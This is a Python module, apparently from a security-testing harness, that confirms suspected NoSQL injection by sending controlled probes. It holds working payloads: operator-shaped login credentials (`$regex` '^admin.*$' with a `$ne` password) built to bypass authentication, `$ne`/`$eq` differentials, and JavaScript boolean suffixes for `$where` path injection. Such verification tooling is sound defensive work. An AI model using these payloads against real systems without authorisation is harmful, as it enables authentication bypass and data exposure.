"""Deterministic NoSQL operator-injection confirmation.

Login forms: the leg uses two fresh pre-auth sessions. A negative-control username
regex that cannot match must remain on the login boundary; an otherwise identical
regex for the declared administrator identity must reach an authenticated
administrator page. Fresh form pages provide session-bound anti-CSRF values for
each attempt.

Any other request (r7: JSON-body POST/PUT findings were skipped unsent, and the
only nosql traffic of the run was a login-form fetch on another endpoint): an
operator differential on the finding's OWN request -- same method, URL, headers
and body, with one parameter at a time replaced. `{"$ne": t}` must behave
differently from `{"$eq": t}`, while `{"$eq": t}` behaves like the plain string
`t`, and both operator responses must repeat. Every send goes through the run's
transport, so the scope, active and mutating-replay gates apply. The body's own
id-like fields are tried first; a body the crawler guessed (r11: `name`/`value`
on every review write) is not the endpoint's inputs and is never a target.

A backend that rejects `$eq` itself (an "unrecognised operator" error) leaves the
leg without an equality control, so `{"$in": [t]}` stands in for it when `$eq` does
not behave like the plain string. A response that reports how many objects it
matched or changed (a count field or a result array) is compared by that count, so
a write whose echoed objects differ between sends is still comparable; when no
equality control works, an operator that matched more objects than the captured
value did (and repeats) still confirms the widened match set.

A GET/HEAD's id-like path segments are injection points too (a server-side
`$where` / JavaScript filter built from a route parameter): each family of
equal-length JavaScript boolean suffixes (`v' || '1'=='1` / `v' && '1'=='2`, the
same quoted with `"`, and unquoted for numeric ids) must split into a true answer
wider than a false one, the false answer must look like a missing id, the two
neutral suffixes (`|| false`, `&& true`) must look like the captured id, and the
true and false answers must repeat. A route that treats the segment as a plain
string or strips its punctuation answers all four alike.
"""
from __future__ import annotations

import re
import json
import uuid
from urllib.parse import parse_qsl, quote, unquote, urlencode, urljoin, urlsplit, urlunsplit

from harness import global_throttle
from harness.feature_workflow import extract_forms
from harness.models import Finding, HttpExchange
from .base import ValidationResult, Validator
from .injection_targets import (
    BODY, PARTIAL_COVERAGE, QUERY, coverage_note, guessed_body, param_targets,
    replay_headers, select_targets, tested_inputs)
from .sqlmap import _content_type_of, _looks_like_json, _mutate_json_param

_MAX_PARAMS = 3
# $ne, the plain value, $eq (and {"$in": [t]} when the backend rejects $eq), then
# $ne and the equality control again: what one confirmation of a write costs.
_SENDS_PER_VERDICT = 6
# Path probing is GET/HEAD only; at most this many id-like segments are tried.
_MAX_PATH_SEGMENTS = 2
_PATH_ID = re.compile(
    r"^(?:\d{1,19}|(?=[A-Za-z0-9_-]*\d)[A-Za-z0-9][A-Za-z0-9_-]{3,79})$")
_VERSION_SEGMENT = re.compile(r"^v\d+$", re.I)
# A body field naming the object a write or lookup matches on.
_ID_FIELD = re.compile(r"^(?:(?i:_?id)|.+(?:_id|Id|ID))$")
# Fields a JSON response uses to say how many objects a filter matched or a write
# changed; matched counts first, so a repeated no-op write still compares alike.
_COUNT_KEYS = ("matchedCount", "matched", "nMatched", "n", "modifiedCount", "nModified",
               "modified", "affectedRows", "affected", "deletedCount", "deleted", "count")
_LIST_KEYS = ("data", "items", "results", "rows", "records", "docs", "documents",
              "original", "updated")


_USER = re.compile(r"(?:^|[_-])(user(?:name)?|login|email)(?:$|[_-])", re.I)
_PASS = re.compile(r"(?:^|[_-])(pass(?:word)?|pwd)(?:$|[_-])", re.I)
_ADMIN_READBACK = re.compile(
    r"(?:your\s+username\s+is\s*:?\s*</?[^>]*>\s*administrator|"
    r"(?:username|account|user)[^\n]{0,80}\badmin[a-z0-9_-]*\b)", re.I)


def _credential_names(body: str) -> tuple[str, str]:
    raw = (body or "").strip()
    if raw.startswith("{"):
        try:
            obj = json.loads(raw)
            names = list(obj) if isinstance(obj, dict) else []
        except (TypeError, ValueError):
            names = []
    else:
        names = [k for k, _ in parse_qsl(raw, keep_blank_values=True)]
    user = next((k for k in names if _USER.search(k)), "")
    password = next((k for k in names if _PASS.search(k)), "")
    return user, password


def _administrator_readback(final_url: str, body: str) -> bool:
    parts = urlsplit(final_url or "")
    query = dict(parse_qsl(parts.query, keep_blank_values=True))
    return query.get("id", "").lower().startswith("admin") or bool(
        _ADMIN_READBACK.search(body or ""))


def _login_boundary(exchange: HttpExchange) -> bool:
    return ((exchange.method or "GET").upper() == "POST"
            and "login" in (urlsplit(exchange.url or "").path or "").lower()
            and all(_credential_names(exchange.request_body or "")))


def _json_object(body: str | None):
    try:
        doc = json.loads(body or "")
    except (TypeError, ValueError):
        return None
    return doc if isinstance(doc, dict) else None


def _id_like(name: str) -> bool:
    return bool(_ID_FIELD.match(name or ""))


def operator_targets(exchange: HttpExchange) -> list[tuple[str, str]]:
    """The inputs the operator differential can carry an operator in: query and
    body parameters, but only query parameters on a GET/HEAD (a body there is not
    the request's input).

    A guessed body's fields are not the endpoint's inputs, so none is a target
    (r11: nine runs on the review writes put operators only into the crawler's
    `name`/`value` guess). A body's own id-like fields (`id`, `_id`, `productId`)
    come first, so the parameter cap never drops the key a filter matches on."""
    targets = param_targets(exchange)
    if (exchange.method or "GET").upper() in ("GET", "HEAD"):
        targets = [t for t in targets if t[0] == QUERY]
    elif guessed_body(exchange):
        targets = [t for t in targets if t[0] != BODY]
    return sorted(targets, key=lambda t: not (t[0] == BODY and _id_like(t[1])))


def json_write_fields(exchange: HttpExchange) -> list[str]:
    """The scalar top-level fields of a captured JSON object body on a PUT/PATCH,
    which the operator differential can carry an operator in; [] for any other
    request, for a guessed body, and for a body with no scalar field.

    POST is left out: the differential replays the write six times and deletes
    nothing, and the write checks' restore rule runs a create only when it can
    delete what it made (docs/WRITE_CHECKS.md)."""
    if (exchange.method or "GET").upper() not in ("PUT", "PATCH"):
        return []
    if _json_object(exchange.request_body) is None or guessed_body(exchange):
        return []
    return [p for loc, p in operator_targets(exchange) if loc == BODY]


def _bracket_operator(pairs: list[tuple[str, str]], param: str, op: str | None,
                      value) -> list[tuple[str, str]]:
    if op is None:
        repl = [(param, value)]
    elif isinstance(value, list):  # p[$in][0]=v: the qs-style array form
        repl = [(f"{param}[{op}][{i}]", str(v)) for i, v in enumerate(value)]
    else:
        repl = [(f"{param}[{op}]", value)]
    out: list[tuple[str, str]] = []
    for k, v in pairs:
        out.extend(repl if k == param else [(k, v)])
    return out


def operator_request(exchange: HttpExchange, loc: str, param: str, op: str | None,
                     value) -> tuple[str, str] | None:
    """(url, body) with `param` carrying `{op: value}` (or the plain `value` when
    `op` is None): a JSON object in a JSON body, a bracketed key (`p[$ne]=v`) in a
    query or form body. None when the request does not carry `param` there."""
    url, body = exchange.url, exchange.request_body or ""
    if loc == QUERY:
        parts = urlsplit(url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        if not any(k == param for k, _ in pairs):
            return None
        query = urlencode(_bracket_operator(pairs, param, op, value))
        return urlunsplit((parts.scheme, parts.netloc, parts.path, query, parts.fragment)), body
    if _looks_like_json(body, _content_type_of(exchange)):
        mutated = _mutate_json_param(body, param, {op: value} if op else value)
        return (url, mutated) if mutated is not None else None
    pairs = parse_qsl(body, keep_blank_values=True)
    if not any(k == param for k, _ in pairs):
        return None
    return url, urlencode(_bracket_operator(pairs, param, op, value))


def match_count(body: str | None) -> int | None:
    """How many objects a JSON response says its request matched or changed: a
    top-level array's length, a count field, or the length of a result array.
    None when the body states no such number."""
    try:
        doc = json.loads(body or "")
    except (TypeError, ValueError):
        return None
    if isinstance(doc, list):
        return len(doc)
    if not isinstance(doc, dict):
        return None
    for key in _COUNT_KEYS:
        value = doc.get(key)
        if isinstance(value, int) and not isinstance(value, bool):
            return value
    for key in _LIST_KEYS:
        if isinstance(doc.get(key), list):
            return len(doc[key])
    return None


def _shape(outcome) -> tuple:
    """A response's comparable shape: its status and, when the body states how
    many objects matched, that count; otherwise a coarse body length (a created
    object's id or timestamp must not read as a behaviour change)."""
    count = match_count(outcome.body)
    if count is not None:
        return (outcome.status, "matched", count)
    return (outcome.status, len((outcome.body or "").strip()) // 64)


def path_id_segments(exchange: HttpExchange) -> list[int]:
    """Indexes of a GET/HEAD's id-like path segments (a number, or a token of
    letters, digits, '-' and '_' that holds a digit), rightmost first."""
    if (exchange.method or "GET").upper() not in ("GET", "HEAD"):
        return []
    segments = urlsplit(exchange.url or "").path.split("/")
    hits = [i for i, seg in enumerate(segments)
            if seg and _PATH_ID.match(unquote(seg)) and not _VERSION_SEGMENT.match(seg)]
    return list(reversed(hits))[:_MAX_PATH_SEGMENTS]


def _with_segment(url: str, index: int, value: str) -> str:
    parts = urlsplit(url)
    segments = parts.path.split("/")
    segments[index] = quote(value, safe="")
    return urlunsplit((parts.scheme, parts.netloc, "/".join(segments), parts.query,
                       parts.fragment))


def boolean_families(value: str) -> list[tuple[str, tuple[str, str, str, str]]]:
    """(label, (true, false, neutral-or, neutral-and)) JavaScript suffix families
    for a path value, each member the same length so an echo cannot tell them
    apart: the true member widens a filter, the false one empties it, and the two
    neutral ones leave the captured value's own match."""
    def family(q: str) -> tuple[str, str, str, str]:
        one = f"{q}1{q}"
        return (f"{value}{q} || {one}=={q}1", f"{value}{q} && {one}=={q}2",
                f"{value}{q} || {one}=={q}2", f"{value}{q} && {one}=={q}1")
    quoted = [("single-quoted", family("'")), ("double-quoted", family('"'))]
    if value.isdigit():
        bare = (f"{value} || 1==1", f"{value} && 1==2", f"{value} || 1==2",
                f"{value} && 1==1")
        return [("unquoted", bare)] + quoted
    return quoted


class NosqlValidator(Validator):
    name = "nosql"
    finding_classes = {"nosql", "nosql injection", "mongodb injection"}
    active = True

    def __init__(self, allowed_hosts=None, timeout: float = 10.0, run_context=None):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self.run_context = run_context

    def _result(self, status: str, summary: str, *, confirmed: bool = False,
                confidence: float = 0.0, evidence: str = "") -> ValidationResult:
        return ValidationResult(
            validator=self.name, status=status, finding_class="nosql",
            confidence=confidence, confirmed=confirmed, summary=summary,
            evidence=evidence)

    async def _attempt(self, exchange: HttpExchange, user_name: str,
                       pass_name: str, *, administrator: bool):
        ctx = self.run_context
        if ctx is None:
            return None
        sid = f"nosql-login-{uuid.uuid4().hex[:10]}"
        ctx.sessions.register(sid, sid, allowed_origins=[exchange.url],
                              role="anonymous", name="nosql pre-auth", ephemeral=True)
        transport = ctx.target_transport()
        await global_throttle.acquire()
        page = await transport.send(
            "GET", exchange.url, capability=self.name, session_ref=sid,
            max_redirects=2)
        if not page.ok or page.status != 200:
            return None
        forms = extract_forms(page.body or "", page.final_url or exchange.url)
        form = next((f for f in forms if any(
            (fld.type or "").lower() == "password" or
            _PASS.search(fld.name or "") for fld in f.fields)), None)
        if form is None:
            return None
        values: list[tuple[str, str]] = []
        for field in form.fields:
            name = field.name or ""
            if not name or name in (user_name, pass_name):
                continue
            values.append((name, field.value or ""))
        pattern = "^admin.*$" if administrator else "^harness-no-such-user-[a-f0-9]{24}$"
        ctype = " ".join(str(v) for k, v in (exchange.request_headers or {}).items()
                         if str(k).lower() == "content-type").lower()
        if "application/json" in ctype:
            document = {k: v for k, v in values}
            document[user_name] = {"$regex": pattern}
            document[pass_name] = {"$ne": "harness-impossible-password"}
            body = json.dumps(document, separators=(",", ":"))
            content_type = "application/json"
        else:
            values.extend(((f"{user_name}[$regex]", pattern),
                           (f"{pass_name}[$ne]", "harness-impossible-password")))
            body = urlencode(values)
            content_type = "application/x-www-form-urlencoded"
        await global_throttle.acquire()
        return await transport.send(
            (form.method or "POST").upper(), urljoin(page.final_url or exchange.url, form.action),
            capability=self.name, session_ref=sid,
            headers={"Content-Type": content_type}, body=body, max_redirects=3)

    async def _operator_differential(self, finding: Finding, exchange: HttpExchange,
                                     note: str = "") -> ValidationResult:
        """$ne vs $eq vs plain-string differential on the finding's own request,
        then (GET/HEAD) the boolean-suffix differential on its id-like path segments."""
        targets, coverage = select_targets(finding, operator_targets(exchange), _MAX_PARAMS)
        guessed = ((exchange.method or "GET").upper() not in ("GET", "HEAD")
                   and guessed_body(exchange))
        if guessed:
            # The body's fields were never tested: not a negative for the endpoint.
            note = (" (the request body is the crawler's guess, not the endpoint's "
                    "inputs, so no body field was tested)") + note
            coverage = coverage or PARTIAL_COVERAGE
        # A per-parameter dispatch is bound to the one input it names.
        segments = ([] if getattr(finding, "parameter_only", False)
                    else path_id_segments(exchange))
        if not targets and not segments:
            return self._result("skipped", "the captured request has no query or body "
                                           "parameter, nor an id-like path segment of a "
                                           "GET, to carry a NoSQL operator" + note)
        ctx = self.run_context
        from harness.run_context import TypedRequest
        from .transport import bind_session
        session_ref, headers = bind_session(ctx, replay_headers(exchange))
        method = (exchange.method or "GET").upper()
        finding_id = getattr(finding, "finding_id", "") or ""
        if method not in ("GET", "HEAD") and finding_id:
            # A write is replayed once per probe: refuse up front, unsent, when the
            # per-finding write ceiling cannot pay for one verdict (fail closed).
            try:
                left, used, ceiling = ctx.gate.mutating_headroom(finding_id, self.name)
            except Exception:
                left, used, ceiling = 0, 0, 0
            if left < _SENDS_PER_VERDICT:
                return self._result(
                    "skipped",
                    f"the operator differential replays this {method} {_SENDS_PER_VERDICT} "
                    f"times per parameter; the per-finding write ceiling allows {left} more "
                    f"({used}/{ceiling} used; raise validators.mutating_ceiling_by_check."
                    f"{self.name})" + note)
        token = f"harness-nosql-{uuid.uuid4().hex[:12]}"
        counts = {"sent": 0, "answered": 0}

        async def send(loc, param, op, value):
            built = operator_request(exchange, loc, param, op, value)
            if built is None:
                return None
            return await send_raw(*built)

        async def send_raw(url, body):
            await global_throttle.acquire()
            out = await ctx.target_transport().execute(
                TypedRequest(method, url, headers=headers, body=body or None),
                capability=self.name, session_ref=session_ref,
                case_ref=getattr(finding, "finding_id", "") or "", max_redirects=0)
            counts["sent"] += 1 if out.executed else 0
            if not out.ok or out.status is None:
                return None
            counts["answered"] += 1
            return out

        baseline_count = match_count(exchange.response_body)
        decided = []  # targets whose probes all answered: a real negative for them
        for loc, param in targets:
            ne = await send(loc, param, "$ne", token)
            literal = await send(loc, param, None, token)
            eq = await send(loc, param, "$eq", token)
            if ne is None or eq is None or literal is None:
                continue  # unanswered or refused: no verdict for this input
            control_op, control_value = "$eq", token
            if _shape(eq) != _shape(literal):
                # The backend may reject $eq itself; a one-element $in is the same
                # non-matching equality written with another operator.
                alt = await send(loc, param, "$in", [token])
                if alt is not None and _shape(alt) == _shape(literal):
                    eq, control_op, control_value = alt, "$in", [token]
            where = "query" if loc == QUERY else "body"
            if _shape(eq) == _shape(literal) and _shape(ne) != _shape(eq):
                ne2 = await send(loc, param, "$ne", token)
                eq2 = await send(loc, param, control_op, control_value)
                if ne2 is None or eq2 is None:
                    continue
                if _shape(ne2) != _shape(ne) or _shape(eq2) != _shape(eq):
                    decided.append((loc, param))  # unstable: not an operator effect
                    continue
                shown = "{'$eq': t}" if control_op == "$eq" else "{'$in': [t]}"
                widened = self._widening_note(match_count(ne.body), match_count(literal.body),
                                              baseline_count)
                result = self._result(
                    "confirmed",
                    f"the {where} parameter {param!r} of {method} {exchange.url} evaluates "
                    f"NoSQL operators: {{'$ne': t}} answered HTTP {ne.status} "
                    f"({len(ne.body or '')} bytes) twice, while {shown} and the plain string "
                    f"t both answered HTTP {eq.status} ({len(eq.body or '')} bytes)."
                    + widened,
                    confirmed=True, confidence=0.9,
                    evidence=f"Operator differential on the captured request: a non-matching "
                             f"{control_op} and the literal value agree, $ne differs, and both "
                             f"repeat." + widened)
                result.baseline_artifact_id = literal.artifact_id
                result.attack_artifact_id = ne.artifact_id
                result.control_artifact_ids = tuple(
                    a for a in (eq.artifact_id, eq2.artifact_id) if a)
                result.tested_parameters = tested_inputs(finding, [(loc, param)])
                return result
            # No equality control behaves like the plain value: the operator still
            # confirms when it matched more objects than the captured value did,
            # while the plain miss matched fewer, and it repeats.
            ne_count, miss_count = match_count(ne.body), match_count(literal.body)
            if (_shape(ne) != _shape(literal) and ne.status is not None
                    and 200 <= ne.status < 300 and None not in (ne_count, miss_count,
                                                               baseline_count)
                    and ne_count > baseline_count > miss_count and ne_count >= 2):
                ne2 = await send(loc, param, "$ne", token)
                if ne2 is None:
                    continue
                if _shape(ne2) != _shape(ne):
                    decided.append((loc, param))
                    continue
                result = self._result(
                    "confirmed",
                    f"the {where} parameter {param!r} of {method} {exchange.url} evaluates "
                    f"NoSQL operators: {{'$ne': t}} matched {ne_count} objects, twice, where "
                    f"the captured value matched {baseline_count} and the plain string t "
                    f"{miss_count} (the backend rejected the equality operators, HTTP "
                    f"{eq.status}).",
                    confirmed=True, confidence=0.85,
                    evidence="Widened match set on the captured request: an operator value "
                             "matched more objects than the captured value, a plain miss "
                             "matched fewer, and the operator answer repeats.")
                result.baseline_artifact_id = literal.artifact_id
                result.attack_artifact_id = ne.artifact_id
                result.control_artifact_ids = tuple(
                    a for a in (eq.artifact_id, ne2.artifact_id) if a)
                result.tested_parameters = tested_inputs(finding, [(loc, param)])
                return result
            decided.append((loc, param))
        decided_segments, tried_segments = [], 0
        for index in segments:
            tried_segments += 1
            verdict = await self._path_differential(exchange, index, send_raw)
            if isinstance(verdict, ValidationResult):
                verdict.tested_parameters = tested_inputs(finding, [])
                return verdict
            if verdict:
                decided_segments.append(index)
        if not decided and not decided_segments:
            # Nothing reached a verdict (refused by the gate, or unanswered): this is
            # not a negative for the finding.
            return self._result(
                "error" if counts["sent"] else "skipped",
                f"no input of {method} {exchange.url} got a complete operator "
                f"differential ({counts['sent']} sent, {counts['answered']} answered)" + note)
        if (len(decided) < len(targets) or len(decided_segments) < tried_segments) \
                and not coverage:
            coverage = PARTIAL_COVERAGE
        parts = []
        if decided:
            parts.append(f"operator values in {', '.join(p for _, p in decided)} of {method} "
                         f"{exchange.url} behaved like plain strings")
        if decided_segments:
            names = ", ".join(repr(unquote(urlsplit(exchange.url).path.split("/")[i]))
                              for i in decided_segments)
            parts.append(f"JavaScript boolean suffixes on the path segment(s) {names} "
                         f"did not split true from false")
        result = self._result(
            "not_confirmed", "; ".join(parts) + note + coverage_note(coverage, finding))
        result.control_outcome = coverage
        result.tested_parameters = tested_inputs(finding, decided)
        return result

    @staticmethod
    def _widening_note(ne_count, miss_count, baseline_count) -> str:
        if ne_count is None or miss_count is None:
            return ""
        base = "" if baseline_count is None else f", the captured value {baseline_count}"
        return (f" The operator matched {ne_count} objects{base}, the plain miss "
                f"{miss_count}.")

    async def _path_differential(self, exchange: HttpExchange, index: int, send_raw):
        """Boolean-suffix differential on one id-like path segment. Returns a
        confirmed result, True when every probe answered without a split (a
        negative for this segment), or False when no verdict was reached."""
        url = exchange.url
        value = unquote(urlsplit(url).path.split("/")[index])
        miss_value = (str(uuid.uuid4().int)[:max(len(value), 9)] if value.isdigit()
                      else f"harness{uuid.uuid4().hex[:12]}")
        base = await send_raw(url, "")
        miss = await send_raw(_with_segment(url, index, miss_value), "")
        if base is None or miss is None:
            return False
        answered = True
        for label, (true_v, false_v, neutral_or, neutral_and) in boolean_families(value):
            async def probe(v):
                return await send_raw(_with_segment(url, index, v), "")
            t, f = await probe(true_v), await probe(false_v)
            if t is None or f is None:
                answered = False
                continue
            if _shape(t) == _shape(f) or _shape(f) != _shape(miss):
                continue
            t_count, f_count = match_count(t.body), match_count(f.body)
            wider = (t_count > f_count if None not in (t_count, f_count)
                     else len(t.body or "") > len(f.body or ""))
            if not (t.status is not None and 200 <= t.status < 300 and wider):
                continue  # an error on the true member is a syntax split, not a filter
            n_or, n_and = await probe(neutral_or), await probe(neutral_and)
            t2, f2 = await probe(true_v), await probe(false_v)
            if None in (n_or, n_and, t2, f2):
                answered = False
                continue
            if (_shape(n_or) != _shape(base) or _shape(n_and) != _shape(base)
                    or _shape(t2) != _shape(t) or _shape(f2) != _shape(f)):
                continue
            distinct = _shape(base) != _shape(miss)
            detail = (f"the path segment {value!r} of GET {url} is evaluated as JavaScript "
                      f"({label} suffixes): '{true_v}' answered HTTP {t.status} "
                      f"({len(t.body or '')} bytes"
                      + (f", {t_count} objects" if t_count is not None else "")
                      + f") twice, '{false_v}' answered like a missing id (HTTP {f.status}, "
                      f"{len(f.body or '')} bytes) twice, and the neutral suffixes "
                      f"'{neutral_or}' / '{neutral_and}' answered like the captured id "
                      f"(HTTP {base.status}, {len(base.body or '')} bytes).")
            result = self._result(
                "confirmed", detail, confirmed=True, confidence=0.9 if distinct else 0.8,
                evidence="Boolean differential on an id-like path segment: equal-length "
                         "true/false JavaScript suffixes split into a wider and an empty "
                         "answer, both repeat, and the neutral suffixes keep the captured "
                         "id's answer" + ("" if distinct else
                                          " (the captured id answers like a missing one)")
                         + ".")
            result.baseline_artifact_id = base.artifact_id
            result.attack_artifact_id = t.artifact_id
            result.control_artifact_ids = tuple(
                a for a in (f.artifact_id, miss.artifact_id, n_or.artifact_id,
                            n_and.artifact_id, t2.artifact_id, f2.artifact_id) if a)
            return result
        return answered

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        if not self.applies(finding, exchange):
            return self._result("skipped", "finding class is not NoSQL injection")
        if self.run_context is None:
            return self._result("skipped", "run-scoped session transport is required")
        if not _login_boundary(exchange):
            return await self._operator_differential(finding, exchange)
        user_name, pass_name = _credential_names(exchange.request_body or "")

        control = await self._attempt(
            exchange, user_name, pass_name, administrator=False)
        if control is None:
            # No HTML login form behind the URL (an API login): test the captured
            # request itself rather than give up on a page that is not there.
            return await self._operator_differential(
                finding, exchange, note=" (no login form page was available)")
        if not control.ok:
            return self._result("error", "negative-control login request failed to execute")
        if _administrator_readback(control.final_url, control.body or ""):
            return self._result("not_confirmed", "negative control unexpectedly reached an administrator page")

        probe = await self._attempt(
            exchange, user_name, pass_name, administrator=True)
        if probe is None or not probe.ok:
            return self._result("error", "administrator operator probe failed to execute")
        if probe.status == 200 and _administrator_readback(probe.final_url, probe.body or ""):
            return self._result(
                "confirmed",
                "MongoDB operator-shaped credentials bypassed authentication and an independent account page read back the administrator identity.",
                confirmed=True, confidence=0.95,
                evidence="Non-matching regex control stayed unauthenticated; ^admin.*$ plus a password inequality reached an authenticated administrator page.")
        return self._result("not_confirmed", "operator-shaped login did not reach an administrator account page")
